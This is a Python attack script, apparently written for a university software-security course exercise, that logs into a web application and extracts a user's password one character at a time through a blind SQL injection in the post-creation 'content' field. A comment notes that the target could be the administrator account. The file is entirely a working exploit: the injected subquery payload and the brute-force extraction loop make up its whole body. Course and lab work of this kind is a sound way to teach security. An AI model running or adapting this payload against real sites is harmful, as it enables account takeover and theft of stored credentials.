import requests, sys, re, time, random

user_pass = 'pentest1'

params = { 
    'username': 'pentest1',
    'password': user_pass 
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'

s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)

resource = '/create_post'
path = url + resource
chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '{', '}', '_']

target_username = params['username'] # could be 'administrator' 
password = ''

stop = False
print("Password for " + target_username + ": ")
while True:
    stop = True
    for i in range(len(chars)):
        params = { 
            # 'content': 'aaa\',(select password from Users where substr(password, ' + str(len(password)+1) + ',1) = \'' + chars[i] + '\' limit 1)) -- ',
            'content': 'aaa\',(select password from Users where substr(password, ' + str(len(password)+1) + ',1) = \'' + chars[i] + '\' and username like \'' + target_username + '\')) -- ',
            'type': "Private"
        }
        r = s.post(url=path, data=params, allow_redirects=False)
        if r.status_code == 200:
            password += str(chars[i])
            stop = False
            break
    if stop:
        break
    sys.stdout.write(chars[i])
    sys.stdout.flush()
print("")

assert user_pass in password
